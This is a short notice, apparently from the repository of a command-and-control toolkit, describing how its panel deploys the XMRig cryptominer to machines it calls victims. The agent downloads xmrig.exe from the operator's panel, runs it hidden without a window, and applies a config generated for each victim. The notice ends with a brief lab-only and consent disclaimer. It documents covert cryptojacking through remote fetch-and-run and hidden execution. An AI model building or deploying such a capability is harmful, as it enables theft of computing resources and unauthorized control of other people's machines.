# XMRig integration notice (lab use only)

The C2 panel drives **stock open-source XMRig** — nothing custom, nothing
obfuscated:

- Source: https://github.com/xmrig/xmrig (GPL — see that repo for license terms)
- Binary: an official Windows build from
  https://github.com/xmrig/xmrig/releases placed next to `c2_server.py`
  as `xmrig.exe`. Verify before use:
  `sha256sum xmrig.exe` against the release hashes.
- Config: generated per victim by the panel (`/miner/config`, same fields
  as https://xmrig.com/docs/miner/config). `donate-level` floor is 1%,
  the upstream minimum.
- Control: the agent downloads `xmrig.exe` from YOUR panel, runs it hidden
  with `CREATE_NO_WINDOW`, no admin, CPU capped (`max-cpu-usage`, default
  50%). `miner_stop` kills it via `taskkill /F /IM xmrig.exe` and removes
  the pid file. Fully reversible.
- Scope: run only on machines you own, on an isolated lab network.
  Mining on anyone else's hardware without consent is unauthorized use.
